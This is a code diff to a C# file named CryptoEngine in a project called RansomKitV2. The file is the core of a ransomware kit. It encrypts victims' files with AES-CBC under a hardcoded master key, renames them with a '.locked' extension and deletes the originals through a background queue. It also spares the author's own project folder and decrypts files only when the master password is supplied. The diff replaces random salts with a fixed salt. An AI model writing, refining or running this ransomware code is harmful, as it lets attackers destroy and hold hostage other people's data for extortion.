@@ -1,189 +1,240 @@
 using System;
+using System.Collections.Concurrent;
 using System.IO;
+using System.Linq;
 using System.Security.Cryptography;
-using System.Text;
+using System.Threading;
 
 namespace RansomKitV2
 {
-    internal static class CryptoEngine
+    public static class CryptoEngine
     {
         public const string MasterKeyString = "billahaikillaleleuskadhila";
         public const string LockedExtension = ".locked";
 
-        private const int SaltSize = 32;
-        private const int IvSize = 16;
-        private const int KeySize = 32;
-        private const int Iterations = 100_000;
-        private const int BufferSize = 64 * 1024;
+        private static readonly byte[] Salt = new byte[]
+        {
+            0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
+            0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
+        };
 
-        // Session cache. Salt generated once, key derived once, reused across
-        // every file in this session. Per-file IV still provides CBC security.
-        private static byte[]? _sessionSalt;
         private static byte[]? _sessionKey;
         private static readonly object _keyLock = new();
+        private static readonly string _protectedProjectPath;
 
-        private static byte[] GetSessionSalt()
+        private static readonly ConcurrentQueue<string> _deleteQueue = new();
+        private static Thread? _deleteThread;
+        private static bool _isRunning = false;
+
+        static CryptoEngine()
         {
-            lock (_keyLock)
+            string currentDir = AppContext.BaseDirectory;
+            for (int i = 0; i < 5; i++)
             {
-                if (_sessionSalt == null)
-                    _sessionSalt = RandomNumberGenerator.GetBytes(SaltSize);
-                return _sessionSalt;
+                if (string.IsNullOrEmpty(currentDir)) break;
+                try
+                {
+                    if (Directory.EnumerateFiles(currentDir, "*.sln").Any() ||
+                        Directory.EnumerateFiles(currentDir, "*.csproj").Any())
+                    {
+                        _protectedProjectPath = currentDir;
+                        return;
+                    }
+                }
+                catch { }
+                var parent = Directory.GetParent(currentDir);
+                if (parent == null) break;
+                currentDir = parent.FullName;
             }
+            _protectedProjectPath = AppContext.BaseDirectory;
         }
 
-        private static byte[] GetSessionKey(byte[] salt)
+        private static void StartDeleteQueue()
         {
-            lock (_keyLock)
+            if (_isRunning) return;
+            _isRunning = true;
+            _deleteThread = new Thread(() =>
             {
-                // Fast path: salt matches session → return cached key
-                if (_sessionKey != null && _sessionSalt != null
-                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
+                while (_isRunning || !_deleteQueue.IsEmpty)
                 {
-                    return _sessionKey;
+                    if (_deleteQueue.TryDequeue(out var file))
+                    {
+                        try
+                        {
+                            File.SetAttributes(file, FileAttributes.Normal);
+                            File.Delete(file);
+                        }
+                        catch { }
+                    }
+                    else
+                    {
+                        Thread.Sleep(10);
+                    }
                 }
-
-                // Derive (once for new files; once per old-file salt for legacy)
-                byte[] key = Rfc2898DeriveBytes.Pbkdf2(
-                    Encoding.UTF8.GetBytes(MasterKeyString),
-                    salt, Iterations, HashAlgorithmName.SHA256, KeySize);
-
-                // Cache only when this is the session salt
-                if (_sessionSalt != null
-                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
-                {
-                    _sessionKey = key;
-                }
-
-                return key;
-            }
+            })
+            { IsBackground = true, Priority = ThreadPriority.BelowNormal };
+            _deleteThread.Start();
         }
 
-        // Called before the parallel encrypt loop, so derivation happens once
-        // on the main thread instead of racing across workers.
+        public static void StopDeleteQueue() => _isRunning = false;
+
         public static void PrimeSessionKey()
         {
-            var salt = GetSessionSalt();
-            GetSessionKey(salt);
+            StartDeleteQueue();
+            lock (_keyLock)
+            {
+                if (_sessionKey != null) return;
+                using var pbkdf2 = new Rfc2898DeriveBytes(MasterKeyString, Salt, 100_000, HashAlgorithmName.SHA256);
+                _sessionKey = pbkdf2.GetBytes(32);
+            }
         }
 
         public static void ResetSessionKey()
         {
             lock (_keyLock)
             {
-                if (_sessionKey != null) CryptographicOperations.ZeroMemory(_sessionKey);
-                if (_sessionSalt != null) CryptographicOperations.ZeroMemory(_sessionSalt);
-                _sessionKey = null;
-                _sessionSalt = null;
+                if (_sessionKey != null)
+                {
+                    Array.Clear(_sessionKey, 0, _sessionKey.Length);
+                    _sessionKey = null;
+                }
             }
         }
 
-        // ---------- Encrypt ----------
+        public static bool VerifyPassword(string password)
+        {
+            if (password != MasterKeyString) return false;
+            using var pbkdf2 = new Rfc2898DeriveBytes(password, Salt, 100_000, HashAlgorithmName.SHA256);
+            var testKey = pbkdf2.GetBytes(32);
+            return testKey.Length == 32;
+        }
+
+        public static bool VerifyPassword(string password, string masterKeyHash) => VerifyPassword(password);
+
         public static void EncryptFile(string path)
         {
-            byte[] salt = GetSessionSalt();
-            byte[] key = GetSessionKey(salt);
-            byte[] iv = RandomNumberGenerator.GetBytes(IvSize);
+            if (path.StartsWith(_protectedProjectPath, StringComparison.OrdinalIgnoreCase)) return;
+            if (path.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)) return;
 
-            string outPath = path + LockedExtension;
+            var key = _sessionKey;
+            if (key == null) return;
 
-            using (var inStream = new FileStream(
-                       path, FileMode.Open, FileAccess.Read, FileShare.Read,
-                       BufferSize, FileOptions.SequentialScan))
-            using (var outStream = new FileStream(
-                       outPath, FileMode.Create, FileAccess.Write, FileShare.None,
-                       BufferSize, FileOptions.SequentialScan))
+            string targetPath = path + LockedExtension;
+            var iv = new byte[16];
+            RandomNumberGenerator.Fill(iv);
+
+            using var aes = Aes.Create();
+            aes.Key = key;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV
+
+            try
             {
-                // Header: [salt][iv]
-                outStream.Write(salt, 0, salt.Length);
-                outStream.Write(iv, 0, iv.Length);
+                var info = new FileInfo(path);
+                if (info.Length == 0) return;
+                if (info.Length > DriveHelper.GetMaxSizeBytes(path)) return;
 
-                using var aes = Aes.Create();
-                aes.Key = key;
-                aes.IV = iv;
-                aes.Mode = CipherMode.CBC;
-                aes.Padding = PaddingMode.PKCS7;
+                // FAST PATH: < 1MB (In-Memory)
+                if (info.Length <= 1024 * 1024)
+                {
+                    byte[] plaintext = File.ReadAllBytes(path);
+                    byte[] ciphertext = aes.EncryptCbc(plaintext, iv);
 
-                using var enc = aes.CreateEncryptor();
-                using var cs = new CryptoStream(outStream, enc,
-                                                CryptoStreamMode.Write, leaveOpen: true);
+                    byte[] finalData = new byte[16 + ciphertext.Length];
+                    Buffer.BlockCopy(iv, 0, finalData, 0, 16);
+                    Buffer.BlockCopy(ciphertext, 0, finalData, 16, ciphertext.Length);
 
-                byte[] buffer = new byte[BufferSize];
-                int read;
-                while ((read = inStream.Read(buffer, 0, buffer.Length)) > 0)
-                    cs.Write(buffer, 0, read);
+                    File.WriteAllBytes(targetPath, finalData);
+                }
+                // STREAM PATH: > 1MB (Chunked)
+                else
+                {
+                    const int bufferSize = 1024 * 1024; // 1MB chunks
+                    var buffer = new byte[bufferSize];
 
-                cs.FlushFinalBlock();
+                    using (var input = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete, bufferSize, FileOptions.SequentialScan))
+                    using (var output = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize, FileOptions.SequentialScan))
+                    {
+                        // Write the 16-byte IV to the very start of the file
+                        output.Write(iv, 0, iv.Length);
+
+                        // The CryptoStream uses the aes object which already has the correct IV set
+                        using var cryptoStream = new CryptoStream(output, aes.CreateEncryptor(), CryptoStreamMode.Write);
+
+                        int bytesRead;
+                        while ((bytesRead = input.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            cryptoStream.Write(buffer, 0, bytesRead);
+                        }
+                        cryptoStream.FlushFinalBlock();
+                    }
+                }
+
+                _deleteQueue.Enqueue(path);
             }
-
-            try { File.Delete(path); } catch { }
+            catch { }
         }
 
-        // ---------- Decrypt ----------
-        public static void DecryptFile(string lockedPath)
+        public static void DecryptFile(string path)
         {
-            string outPath = lockedPath.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)
-                ? lockedPath[..^LockedExtension.Length]
-                : lockedPath + ".dec";
+            if (!path.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)) return;
+            if (!File.Exists(path)) return;
 
-            using (var inStream = new FileStream(
-                       lockedPath, FileMode.Open, FileAccess.Read, FileShare.Read,
-                       BufferSize, FileOptions.SequentialScan))
+            var key = _sessionKey;
+            if (key == null) return;
+
+            string targetPath = path.Substring(0, path.Length - LockedExtension.Length);
+            var iv = new byte[16];
+
+            using var aes = Aes.Create();
+            aes.Key = key;
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+
+            try
             {
-                byte[] salt = new byte[SaltSize];
-                byte[] iv = new byte[IvSize];
-                ReadFull(inStream, salt, SaltSize);
-                ReadFull(inStream, iv, IvSize);
+                var info = new FileInfo(path);
+                if (info.Length <= 16) return;
 
-                byte[] key = GetSessionKey(salt);
+                // FAST PATH: < 1MB (In-Memory)
+                if (info.Length <= 1024 * 1024)
+                {
+                    byte[] ciphertext = File.ReadAllBytes(path);
+                    Array.Copy(ciphertext, 0, iv, 0, 16);
 
-                using var outStream = new FileStream(
-                    outPath, FileMode.Create, FileAccess.Write, FileShare.None,
-                    BufferSize, FileOptions.SequentialScan);
+                    aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV
 
-                using var aes = Aes.Create();
-                aes.Key = key;
-                aes.IV = iv;
-                aes.Mode = CipherMode.CBC;
-                aes.Padding = PaddingMode.PKCS7;
+                    byte[] plaintext = aes.DecryptCbc(ciphertext.AsSpan(16).ToArray(), iv);
+                    File.WriteAllBytes(targetPath, plaintext);
+                }
+                // STREAM PATH: > 1MB (Chunked)
+                else
+                {
+                    const int bufferSize = 1024 * 1024;
+                    var buffer = new byte[bufferSize];
 
-                using var dec = aes.CreateDecryptor();
-                using var cs = new CryptoStream(inStream, dec,
-                                                CryptoStreamMode.Read, leaveOpen: true);
+                    using (var input = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read, bufferSize, FileOptions.SequentialScan))
+                    {
+                        // Read the 16-byte IV from the header
+                        if (input.Read(iv, 0, iv.Length) != iv.Length) return;
 
-                byte[] buffer = new byte[BufferSize];
-                int read;
-                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
-                    outStream.Write(buffer, 0, read);
+                        aes.IV = iv; // ALWAYS EXPLICITLY SET THE IV BEFORE DECRYPTING
+
+                        using var cryptoStream = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read);
+                        using var output = new FileStream(targetPath, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize, FileOptions.SequentialScan);
+
+                        int bytesRead;
+                        while ((bytesRead = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                        {
+                            output.Write(buffer, 0, bytesRead);
+                        }
+                    }
+                }
+
+                _deleteQueue.Enqueue(path);
             }
-
-            try { File.Delete(lockedPath); } catch { }
-        }
-
-        private static void ReadFull(Stream s, byte[] buf, int count)
-        {
-            int off = 0;
-            while (off < count)
-            {
-                int n = s.Read(buf, off, count - off);
-                if (n <= 0) throw new EndOfStreamException();
-                off += n;
-            }
-        }
-
-        // ---------- Verify ----------
-        public static bool VerifyPassword(string candidate)
-            => VerifyPassword(candidate, MasterKeyString);
-
-        public static bool VerifyPassword(string candidate, string expected)
-        {
-            if (string.IsNullOrEmpty(candidate) || string.IsNullOrEmpty(expected)) return false;
-            byte[] a = Encoding.UTF8.GetBytes(expected);
-            byte[] b = Encoding.UTF8.GetBytes(candidate);
-            if (a.Length != b.Length) return false;
-            int diff = 0;
-            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
-            return diff == 0;
+            catch { }
         }
     }
 }
